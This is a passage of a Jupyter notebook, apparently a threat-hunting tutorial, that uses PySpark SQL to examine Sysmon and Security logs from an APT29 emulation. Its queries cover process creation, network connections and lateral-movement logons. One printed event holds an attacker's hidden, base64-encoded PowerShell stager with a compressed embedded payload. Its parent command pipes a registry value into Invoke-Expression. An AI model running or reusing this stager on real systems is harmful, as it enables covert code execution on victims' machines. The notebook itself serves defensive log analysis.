---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n",
      " User              | DMEVALS\\pbeesly                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    \n",
      " LogonId           | 0x13069a                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n",
      " ProcessId         | 8704                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               \n",
      " Image             | C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          \n",
      " CommandLine       | \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnACcASAA0AHMASQBBAE8ASAA4AFUAMQAwAEMAQQA3AFYAVwBlADIALwBhAFMAQgBEAC8AdQA1AEgAeQBIAGEAdwBLAEMAVgB0AEgAdwBFADUASQBTAGkASgBWAE8AaAB0AHMATQBBAEUAQwBHAEoAdABBAGkAcQBxAE4AdgBkAGkAYgByAEIALwBZAGEAeAA3AHAAOQBiAHYAZgBMAEsAKwBtAGEAbABxADEASgA1ADAARgA4AHUANQA0AG4AcgArAFoAbgBkAGwANQBIAHIAbQBNAHgASgBIAHcAOQBHAEkASwBYADAANQBQADMAdgBWAFIAaQBrAEoAQgBMAEcAeAB1AGgAeQBXAGgANABDADYAawBkACsAKwBBAFcAbABnAHUAVgBlAEcAagBJAEQANgBvAFMAZABLAEkAUQAwAFMAaQAyAGMAMQBOAFAAVQA5AFQASABMAEgAZAB2AHQAegBFAFQATQAwAHkASABEADUAUwBnAGoATgBSAEUAdgA0AFIAeABnAEYATwA4AGQAbgBkADQAeABOADIAbQBmAEIARgBLAEgAdwB1AE4AMgBuADgAaQBPAGkAZQBiAFYATgBIAGIAbwBDAEYATQB6AFgAeQArAEwAZABPADcAQwBMAHUAUwBkAGwASwBLAEcARgBpADgAZABPAG4AbwB2AFIAdwBwAHMAegBLACsAaQBKAEgATgBCAE8ATAAxAGkAWgBqAE8AQwB4ADcAbABCAFkAbAA0AGEAdgBFAEQAWQA0ADIAQwBSAGEATABYAGUASwBtAGMAUgBiAFAAVwBYAGwATQBvAG8AdgB6AHMAaAAxAGwAYQBJADUANwBvAEcAMgBKAHUANQBnAEYAcwBaAGMAVgBKAFEAZwBDAGYAaQBsAG0AZQBSAG8ASgBQAEIAdwB1AHYALwBzAHEARgBtAEgAWgBUADIATgBYADkAYgB3AFUAWgAxAG0AeABKAEQAeAB3AHoAUQArAHoAMgBkAC8AaQB3ADkANwBzAE0ASQA4AFkAQwBYAEgAWgBqAEIAaABPADQAOABUAEMANgBaAEsANABPAEMAdQAzAFUATwBSAFIAUABNAFQAegBHAFUAaABaAEwAQwBXAFIAUAA1AE0AawBZAEYAdgBHAHoAMQBnAHMAUgBEAG0AbABKAGUARgBQADEASQBnADkAdgBEAHEAQQA5AHIAdABDADQAbQBzAGgANABPAHEAegBWAEMAcABCAEUAbgA4AE0AcwB4AHQANwBPAGMAVQA3AHcAZQBJAGIAZgB2AEsAOABTAC8ARABzAGMAZwArAG8AZgBUADAAOQBPAFQAMgBaAEgANgBwAGsATQAzAHAAZABKAEwAQgA2ADkANwBCAGQAWQAzAEIATQA3AE0AYwBaADIAWABKADkARgBPAFMAUwAwAEEAVQBiAGkATQBYAHAAQgByAGEARgBVAFoAcABqAGEAWABhAEUAVgBTAGoAawA3AGQATABQAHAAWgBVAEQASwB6AEQARwBzAHYATABaAEEAdABxAEQARQB4AE4AdgBCAGoATAA3AFQAQgBiAG8AawBsAE4ALwBYAG8AOABOAFAAQwBjAFIAYgBtAHcAaQBGAEIATAAzAFUASABMAGkAVwArAGoAaQBPAGMAWABiADgATQBvAEgAdABoADcANABKAEIAYgAzAEgANwBEAFgAdwBCAFQANwBpAEgASABBAGUASgBKAC8ARQBOAE4ARAB3AG8ANgB5AFcAawA2AG8AaAAxAFAAVgBoAFEAeABsADQAQgBVAGsAVAAvAHIAZQBtAFYAMABPAHgASwBJAFoAZABYAEUASQBBAE8AMwAyAFUASABXAEYATwBSAFEANgBQAG4ARAB2AGkAMwB0AHoAcwBNADcAMwB3AEYAUwBzAFUANQBSAGwASgBhAEcAZgB3ADAAbAB6AFMANABLAEYARQBjAFYAZQBTAFYAQwBqAGoATwB3AC8AcQBUAG0ATAB0ADgAdgBpAE4AMwBlADcATwBXAFgARQBSAFIAawA3AHEASgB0AEoATwB4AFQAMwAxAHUAcAB4AGwATABFADAAZAB5AEYAagBFAFAAbgBJAFMAcgBCAEwARQBPAFYAQQBsAEkAUQBXADgAYgBDADIAcwBZAGgALwBzAEYAcAA4AEUANABZADYAbwBoAFQASwBIAHoAUQB0AEkAUQAxAEEANABlAEYAYgBqAE4AZABCAEMAZwA1AEMAegBxAFcAeQBoAFoAawBaAEoAaABTAEgAdwBMAEUAOQA3AGcAWgBGAFAAaAB6AHUAZgBZAGwAdgB5AHcAYgA1ADIAQwB0ACsANwA5ADIAaABnAG4AZgBsAHkAbABFADQAaABQAC8ASwBOADAAaQB0AFIAVwBOAFcARQBoAHkAUwBNAHUAZwBaAEgATgBGAHQAKwBmAHcAWAAyADYAKwBhAEIAWABoAFIAVAAvAEUAKwBBACsATABoAFQARAB4AG8ARwA4AFoAcgB1AFUAQgBRAEwAVQBwADUATABlADQAUgAyAGMAYQBmAE0AbwBqAGQAUwBPAE4AUQBRAHgAbQArAHEAdQA0AGEAZwAvAGkAKwBvAHAAUABHAFoAYgA4AFIAdgA2AGoAdwA2AE0AWgB3ADQARwBpAFcANwBVAHoATgByAHQAZQBtAGwAcwBtAHMAaQBVADQANgBkAGgAQwBZAFIARABGADkAMgBHADkAcwAzAGUAOAB6AE8AYgBrAGQAagBWAHAAdABxADkARgBTADAAOABZADYAbQBLAHQAbQBaAHUAbwB0AGIAVABOAFEATgBOAFYAdABrAFEAOQBPAFcANwBOAHQAawBDAFAAMQB6AHUAQgBwAGIAYQBxAGUARgB2AHIAMwAvAHEAUwArAE0AdgB2AEIAdgBRAG0ARwA2AGgAMwBmADkATwBHAHQAbQBZAEcAcgB5AFYAUABaADEAMgBTAGoAMwByAEcAMABRAEMAZQB5ADYAbAB1AEQAMQBxAEMAcQBUAE0AMQBLAGoAVwByAGsAeABUAEkAdAB0AFQAVQArADIAagB2AGEAMABhAHYAVgAxAHYAMQA2AHAAUABhADYAYgBUAFUAdwA3AGoAeABEAE8AVABlADIAOABzADkAYwBmAHYAcgBjADcARABUADAANwBkADcAbAArADgARQBrADAANABrAE8AZABuAFIAagBNAG4AQQBDAFAASABZAFMAYgBhAHcAYgAwADQARwBUAG0AUAA1AGYASwAzAC8AZwBkAEMAcABWAEkAOQBDAEEAYgBwAEoAMQBKADcARQBxADgAQwBnAEsANABNAEIARwAxAHUAUABsAEIAUgBwAGYASgBvACsAaABJAHcATgBHAFkAOAB1AE0AQQBzAHUAZAAxADAAYwB0AE4AOQBRAHEARgBjAGQAVwBlAGkAYgBCAHgAbQBqADgATABLADkAWAB1AHIAegBlAE8ARAAyAFEAaQBhACsAYwBLAEkAdwA0AHIARwBxAC8ANABsAHkAcABLADcANQBhADMANAAzAE0AdgBEAHUAYQBWAEQAdABQAGEAdAA1AFQATgBRAFMANgBOAE4AQwBsADUAaQBzAGQAOABOAC8ASgBJAHAALwBMAEoALwBkAGsAVwBtAGsAZQA1AFIAcwAxAHYAbABwADYAegArAHYANgA0ADIAZwBnAFQAdwAyADMAYQBvAGQAVABOAHIAaAB3AG4AcQB4ADcAZQA0ADMATwA5AFgAUAB2AHAAVwBkADIAbQA4AHkAZQBqAGgAeQA3ACsAMABKAEQAUwAxAGQAUQA3AHoAegBRAGUAMABaAHQAMAB3AHUAaABiADQAUwAyAGIARAB2AFgAZwB6AHQANwBPAE0ASgBHADkAdwBJADkARABhAHMAVABYAHoATwBKAHkAMwAwADMASgBoAHgAagBXAHkAWgBWAHQAWABIAHIAQgAxAHYARAAyAGcAQgBpAGEANgA5AHIAbgBkAFMAeABxAGgAOABxADEAdwA3AHcAVABoAGQAMQBlAG0AMgBTAHUAYgBGAG8ASwBZAG0ARgBUAEIAVgBLAFIAMgBzAFQAcgBDADAAMAB3AEIAUAA4AFYAbwBiAEoAMQBkAEYAdgAwAEsAbgBhAFMAcwBMADUAZQAxADIAWAA4AHYALwBJAGwAcQBQAFcAaQBzAGoATgBaAG0AdABaAFUAUwBiADMAcQBqAGUAOABOAHQAZQAxAHAAcQBrAEQAUgBDAEMAdgAxAHgAcgAzAC8AawBIAGUANgBsAGYANgBuAHQAcABKAEYAMwBuAGcAYwBKAEsAdAAwAE0AWABBAFMATgByAEUAYQAyAG4AVgBRAEEAUABmAEEARABaADEASwB6AGQASgBqAEQANAA5AHkAcgBWADcAWQBJAGUAMABMACsARgBmAHMAMABuADcALwBCAGwAcwBxAHEAcQAvADkAWABWAE8AMgAzAGwAdwBPAHkAYgBZADMATABMAHoAdQBQAHoAYQB3AE8AZQAxAG0ASQBXAG8AbwAwAEUAOQByAHEAcgBnAGwAOQBlAGUAcgBKAFIAZwBvAFIAcQBVAFkANwBCAGkAcQBEADIAdQBYAE4AcwBmADMALwBQAGoAQwBPAGUAeAA0AEcARwA1AFEAMQA4AGQAdABKACsATgB4AFMANQBLAHMAdwBCAFIATwBJAEEAdwA4AEEANwB0AHoAbwBoAFQAWQB6AC8ARgArAGoASABoAEUAcQBMAEkANwB6AHoAUABPAEkAMAB3AGgAVgBzAEQAMwBDAHMATwBqAFUATwBsAE4ASABiADUAQQBJAFYAeABCADYATgA3AE4AMQBEADUAZgBMAGQAaABlAFgASAArADUAawBvAFMAagBvAHoAUwB0ADcAbAA2AEkATgAzAGMAVABNAEYARgA2AEUAUABiAFoAbABIAHUANABNAGgAbgBRAFUAbABlAFgAOABnAHkAagBFAHAANQBYAFoAVQBoAHkATgArAFAAcQB4ADQAbgBHADMARwBuAHEAOABSAG4ANwBRADYAYQBvADMAcQA2AFYAUwAvAHgATABsAFcAWQB0ADYANAAvAC8ASwArAFkANwBWAHQAagBBAEMALwB2ADEANQBoADkAbwAvADMAaQA2ADIALwBoAEsASgBmADIARQBmADkAQQAvADUANwB3AFIANgBEACsAYQBlAEIAagBSAEIAZwB3AFcAdABEAFkASwBkADUAZABLAGQANgBLAGYAMQA4AGUAcgArADUAYQBQAEMAVwBRACsALwBuACsANABWAGYAbAB1ADUAeQBkADkAZQBBAEsAZABuAHIAeQBMAC8AdwBMAHYAcwAyAFIAQwB3AEEAQQAnACcAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA= \n",
      " ParentProcessId   | 8588                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               \n",
      " ParentImage       | C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          \n",
      " ParentCommandLine | powershell.exe -c \"Get-ItemPropertyValue 'HKLM:\\\\SOFTWARE\\Javasoft' 'value Supplement' | Invoke-Expression\"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        \n",
      " CommandLineLength | 7106                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               \n",
      "\n"
     ]
    }
   ],
   "source": [
    "sysmon1 = spark.sql(\n",
    "    '''\n",
    "SELECT User, LogonId, ProcessId, Image, CommandLine, ParentProcessId, ParentImage, ParentCommandLine,\n",
    "        length(CommandLine) as CommandLineLength\n",
    "FROM apt29HostDay1\n",
    "WHERE Channel = \"Microsoft-Windows-Sysmon/Operational\"\n",
    "    AND EventID = 1\n",
    "    AND length(CommandLine) > 7000\n",
    "                          ''')\n",
    "print('We have ', sysmon1.count(), ' records')\n",
    "sysmon1.show(truncate = False, vertical = True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This event might represent the **potential execution** of a **PowerSheel script** **:O**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Let's get all the **Sysmon** events related to its **ProcessId 8704** as a Child"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------+-----+\n",
      "|EventID|count|\n",
      "+-------+-----+\n",
      "|12     |236  |\n",
      "|7      |84   |\n",
      "|11     |3    |\n",
      "|23     |3    |\n",
      "|17     |2    |\n",
      "|13     |2    |\n",
      "|5      |1    |\n",
      "|1      |1    |\n",
      "|18     |1    |\n",
      "|10     |1    |\n",
      "+-------+-----+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "process8704 = spark.sql(\n",
    "    '''\n",
    "SELECT EventID , count(*) as count\n",
    "FROM apt29HostDay1\n",
    "WHERE ProcessId = 8704\n",
    "\n",
    "GROUP BY EventID\n",
    "ORDER BY count DESC\n",
    "                          ''')\n",
    "process8704.show(truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "It is common to start looking for **PowerShell** events because it is a tool that **enables** a lot of other **techiques**. We should also focus on the events related to this process to identify other behaviors and techniques.\n",
    "* Notes: 12 (Registry creation and deletion), 7 (Image Loaded), 11 (File Creation), 23 (File Delete), 17 (Pipe Created), 13 (Registry Modification), 1 (Process Creation), 10 (Process Access), 18 (Pipe Connected), 5 (Process Terminated)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### d) Let's now analyze information of Sysmon 3: Network Connection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's query the info for this event and calculate the **most frequent** pair or IPs (Source -> Destination):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-----------------------------+-----+\n",
      "|SourceDestinationIP          |count|\n",
      "+-----------------------------+-----+\n",
      "|10.0.1.6 <--> 192.168.0.4    |348  |\n",
      "|10.0.1.4 <--> 10.0.0.4       |160  |\n",
      "|10.0.1.6 <--> 10.0.0.4       |88   |\n",
      "|10.0.1.4 <--> 10.0.1.6       |34   |\n",
      "|10.0.1.5 <--> 10.0.0.4       |18   |\n",
      "|10.0.1.4 <--> 192.168.0.4    |8    |\n",
      "|10.0.1.4 <--> 168.61.186.235 |7    |\n",
      "|10.0.1.4 <--> 23.4.15.75     |4    |\n",
      "|10.0.1.4 <--> 52.167.250.154 |4    |\n",
      "|10.0.1.4 <--> 23.56.173.48   |4    |\n",
      "|10.0.1.4 <--> 10.0.1.255     |4    |\n",
      "|10.0.1.6 <--> 52.167.250.154 |4    |\n",
      "|10.0.1.4 <--> 192.168.0.5    |3    |\n",
      "|10.0.1.5 <--> 10.0.1.255     |3    |\n",
      "|10.0.1.6 <--> 10.0.1.255     |3    |\n",
      "|10.0.1.4 <--> 239.255.255.250|2    |\n",
      "|10.0.1.4 <--> 72.21.81.200   |2    |\n",
      "|10.0.1.4 <--> 40.90.137.124  |1    |\n",
      "|10.0.1.5 <--> 52.114.159.32  |1    |\n",
      "|10.0.1.6 <--> 52.114.159.32  |1    |\n",
      "+-----------------------------+-----+\n",
      "only showing top 20 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "sysmon3 = spark.sql(\n",
    "    '''\n",
    "SELECT concat_ws(' <--> ',SourceIp,DestinationIp) as SourceDestinationIP, count(*) as count\n",
    "FROM apt29HostDay1\n",
    "WHERE Channel = \"Microsoft-Windows-Sysmon/Operational\"\n",
    "    AND EventID = 3\n",
    "    AND NOT SourceIp = DestinationIp\n",
    "    AND (SourceIp = \"10.0.1.4\" OR SourceIp = \"10.0.1.5\" OR SourceIp = \"10.0.1.6\")\n",
    "    \n",
    "GROUP BY concat_ws(' <--> ',SourceIp,DestinationIp)\n",
    "ORDER BY count DESC\n",
    "                          ''')\n",
    "sysmon3.show(truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### e) So, Is this all the potential of PySpark.SQL?... \"JOIN\" me in learning more about it :D"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's take a look at the **Lateral Movement** tactic accomplished during Day 1:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](images/lateral1.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "![](images/lateral2.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Let's query the host data for day 1 using **Security 4624 (Account Successfully Logged On)** event as a reference:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "scrolled": true,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "There are  94  records.\n",
      "+---------------------+-------+---------------+--------------+--------------+-------------+---------+\n",
      "|Hostname             |EventID|SubjectUserName|SubjectLogonId|TargetUserName|TargetLogonId|IpAddress|\n",
      "+---------------------+-------+---------------+--------------+--------------+-------------+---------+\n",
      "|NEWYORK.dmevals.local|5140   |pbeesly        |0x5dd594      |pbeesly       |0x5dd594     |10.0.1.4 |\n",
      "|NEWYORK.dmevals.local|5145   |pbeesly        |0x5dd594      |pbeesly       |0x5dd594     |10.0.1.4 |\n",
      "|NEWYORK.dmevals.local|4661   |pbeesly        |0x5dd594      |pbeesly       |0x5dd594     |10.0.1.4 |\n",
      "|NEWYORK.dmevals.local|4658   |pbeesly        |0x5dd594      |pbeesly       |0x5dd594     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |4672   |pbeesly        |0x861a79      |pbeesly       |0x861a79     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5140   |pbeesly        |0x861a79      |pbeesly       |0x861a79     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x861a79      |pbeesly       |0x861a79     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x861a79      |pbeesly       |0x861a79     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x861a79      |pbeesly       |0x861a79     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x861a79      |pbeesly       |0x861a79     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |4672   |pbeesly        |0x861ac7      |pbeesly       |0x861ac7     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |4672   |pbeesly        |0x861ad9      |pbeesly       |0x861ad9     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |4672   |pbeesly        |0x861aec      |pbeesly       |0x861aec     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |4672   |pbeesly        |0x866b2c      |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5140   |pbeesly        |0x866b2c      |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5140   |pbeesly        |0x866b2c      |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "+---------------------+-------+---------------+--------------+--------------+-------------+---------+\n",
      "only showing top 20 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "lateralMovement = spark.sql(\n",
    "    '''\n",
    "    SELECT\n",
    "        o.Hostname, o.EventID, o.SubjectUserName, o.SubjectLogonId,\n",
    "        a.TargetUserName, a.TargetLogonId, a.IpAddress\n",
